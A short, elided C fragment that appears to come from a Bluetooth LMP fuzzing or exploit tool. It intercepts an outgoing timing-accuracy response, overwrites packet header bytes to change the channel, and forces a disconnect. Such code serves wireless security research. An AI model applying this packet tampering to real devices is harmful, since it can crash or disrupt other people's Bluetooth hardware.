...
static int tx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    ...
    // Wait for LMP_timing_accuracy_res
    if (pkt_length >= 5 && IS_LMP_OPCODE(pkt_buf, 48))
    // if (pkt_length >= 5 && IS_LMP_OPCODE(pkt_buf, 35) || IS_LMP_OPCODE(pkt_buf, 45))
    {
        flag = 0;
        // Change packet header channel
        pkt_buf[0] = 0x63;
        pkt_buf[4] = 0xb6;
        m_disconnect(p);
        return 1;
